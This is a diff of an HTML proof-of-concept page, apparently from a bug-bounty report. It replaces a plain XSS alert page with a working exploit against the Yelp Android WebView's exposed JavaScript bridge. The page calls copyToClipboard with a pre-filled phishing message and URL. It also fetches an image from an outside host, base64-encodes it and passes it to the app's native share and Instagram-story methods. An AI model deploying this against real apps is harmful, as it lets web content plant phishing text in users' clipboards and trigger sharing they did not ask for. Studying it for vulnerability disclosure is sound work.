@@ -1,15 +1,133 @@
- <!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>XSS Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yelp WebView JS Interface PoC (Remote Image)</title>
+    <style>
+        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
+        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1, h2 { color: #c41200; } button { background-color: #0073bb; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; margin-bottom: 10px; display: block; width: 100%; box-sizing: border-box; }
+        button:hover { background-color: #005ea6; }
+        textarea { width: 100%; box-sizing: border-box; margin-bottom:10px; padding: 8px; border-radius: 4px; border: 1px solid #ccc;}
+        .info { background-color: #e7f3fe; border-left: 6px solid #2196F3; padding: 10px; margin-bottom: 15px;}
+        img#preview { max-width: 200px; max-height:200px; border:1px solid #ccc; margin-top:10px; display: block;}
+        .status { margin-top: 10px; font-style: italic; }
+    </style>
 </head>
 <body>
-    <h1>XSS PoC Page</h1>
+    <div class="container">
+        <h1>Yelp WebView JavaScript Interface PoC (Remote Image)</h1>
+        <p>This page will fetch an image from a URL, convert it to base64, and then use the exposed JavaScript interfaces.</p>
+
+        <div class="info">
+            The image will be fetched from: <code id="imageUrlDisplay"></code>
+        </div>
+        <img id="preview" alt="Image preview will load here" />
+        <div id="statusMessage" class="status"></div>
+
+        <h2>1. Test `copyToClipboard`</h2>
+        <label for="clipboardText">Text to copy:</label>
+        <textarea id="clipboardText">Malicious URL: https://example-phishing-site.com/yelp-login --- Your Yelp account needs verification!</textarea>
+        <button onclick="testCopyToClipboard()">Copy to Clipboard</button>
+
+        <h2>2. Test `openBottomSharingScreen` (with remote cat image)</h2>
+        <button onclick="processImageAndShare('openBottomSharingScreen')">Share Cat Image (System Share)</button>
+
+        <h2>3. Test `yoyShareToInstagram` (with remote cat image)</h2>
+        <button onclick="processImageAndShare('yoyShareToInstagram')">Share Cat Image to Instagram Stories</button>
+    </div>
+
     <script>
-        alert('XSS by gelo from controlled domain: ' + document.domain);
-        // You can add other JavaScript here if needed for your PoC
-        // For example, trying to get user-agent, etc.
-        // alert(navigator.userAgent);
+        const imageUrl = "http://gelo.gg/xss-poc/funny-cat.jpg"; // Your image URL
+        document.getElementById('imageUrlDisplay').textContent = imageUrl;
+        document.getElementById('preview').src = imageUrl; // Show a preview directly
+
+        let imageBase64Data = null; // To store the fetched base64 data
+
+        function fetchAndConvertImageToBase64(url) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = "Fetching image...";
+            return fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok: ' + response.statusText);
+                    }
+                    statusEl.textContent = "Image fetched, converting to blob...";
+                    return response.blob();
+                })
+                .then(blob => {
+                    statusEl.textContent = "Blob created, converting to base64...";
+                    return new Promise((resolve, reject) => {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            // result includes "data:image/jpeg;base64," prefix, remove it
+                            const base64WithPrefix = reader.result;
+                            const pureBase64 = base64WithPrefix.split(',')[1];
+                            statusEl.textContent = "Base64 conversion complete!";
+                            resolve(pureBase64);
+                        };
+                        reader.onerror = reject;
+                        reader.readAsDataURL(blob);
+                    });
+                })
+                .catch(error => {
+                    statusEl.textContent = 'Error fetching or converting image: ' + error;
+                    console.error('Error fetching or converting image:', error);
+                    alert('Error fetching or converting image: ' + error);
+                    return null;
+                });
+        }
+
+        async function processImageAndShare(interfaceMethodName) {
+            const statusEl = document.getElementById('statusMessage');
+            if (!imageBase64Data) {
+                statusEl.textContent = "Image base64 data not yet fetched. Fetching now...";
+                imageBase64Data = await fetchAndConvertImageToBase64(imageUrl);
+            }
+
+            if (!imageBase64Data) {
+                alert('Could not get base64 data for the image. Sharing aborted.');
+                statusEl.textContent = "Failed to get base64 data. Aborted.";
+                return;
+            }
+
+            if (window.Android && typeof window.Android[interfaceMethodName] === 'function') {
+                try {
+                    window.Android[interfaceMethodName](imageBase64Data);
+                    alert('Attempted to call ' + interfaceMethodName + ' with the cat image.');
+                    statusEl.textContent = "Called " + interfaceMethodName;
+                } catch (e) {
+                    alert('Error calling ' + interfaceMethodName + ': ' + e.toString());
+                    statusEl.textContent = 'Error calling ' + interfaceMethodName + ': ' + e.toString();
+                }
+            } else {
+                alert('Android.' + interfaceMethodName + ' interface not found.');
+                statusEl.textContent = 'Android.' + interfaceMethodName + ' interface not found.';
+            }
+        }
+
+        function testCopyToClipboard() {
+            const textToCopy = document.getElementById('clipboardText').value;
+            if (window.Android && typeof window.Android.copyToClipboard === 'function') {
+                try {
+                    window.Android.copyToClipboard(textToCopy);
+                    alert('Attempted to copy to clipboard:\n"' + textToCopy + '"\n\nCheck your clipboard!');
+                } catch (e) {
+                    alert('Error calling copyToClipboard: ' + e.toString());
+                }
+            } else {
+                alert('Android.copyToClipboard interface not found.');
+            }
+        }
+
+        // Optional: Pre-fetch the image when the page loads so it's ready faster
+        // document.addEventListener('DOMContentLoaded', async () => {
+        //     imageBase64Data = await fetchAndConvertImageToBase64(imageUrl);
+        //     if(imageBase64Data) {
+        //         document.getElementById('statusMessage').textContent = "Image pre-fetched and converted to base64.";
+        //     }
+        // });
     </script>
 </body>
 </html>
